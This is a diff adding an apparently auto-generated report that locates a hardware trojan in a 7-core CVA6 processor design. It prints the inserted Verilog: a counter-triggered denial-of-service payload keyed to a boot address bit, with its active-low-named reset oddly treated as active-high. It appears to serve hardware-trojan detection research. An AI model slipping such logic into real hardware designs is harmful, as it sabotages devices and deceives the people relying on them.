@@ -1,0 +1,33 @@
+Trojan Location Report
+Design 5: 7-core CVA6
+Trigger: counter, Payload: dos
+Generated: 2026-01-21T17:31:08.530012
+================================================================================
+
+Trojan Location: Lines 8329 - 8350
+Trojan Size: 22 lines
+
+Exact Trojan Code:
+--------------------------------------------------------------------------------
+  8329:   // === INSERTED TROJAN START ===
+  8330:   // Trigger: counter, Payload: dos
+  8331:   // Inserted: 2026-01-21T17:30:44.664755
+  8332: 
+  8333:   reg [15:0] trojan_counter_5;
+  8334:   wire trojan_trigger_5;
+  8335: 
+  8336:   always @(posedge clk_i or posedge rst_ni) begin
+  8337:     if (rst_ni)
+  8338:       trojan_counter_5 <= 16'h0000;
+  8339:     else if (boot_addr_i[0])
+  8340:       trojan_counter_5 <= trojan_counter_5 + 1;
+  8341:   end
+  8342:   assign trojan_trigger_5 = (trojan_counter_5 == 16'hFFFF);
+  8343: 
+  8344:   wire trojan_payload_5; assign trojan_payload_5 = trojan_trigger_5 ? 1'b0 : boot_addr_i[0];
+  8345: 
+  8346:   // Connect Trojan signals to output ports
+  8347:   assign trojan_trigger_o = trojan_trigger_5;
+  8348:   assign trojan_payload_o = trojan_payload_5;
+  8349: 
+  8350:   // === INSERTED TROJAN END ===
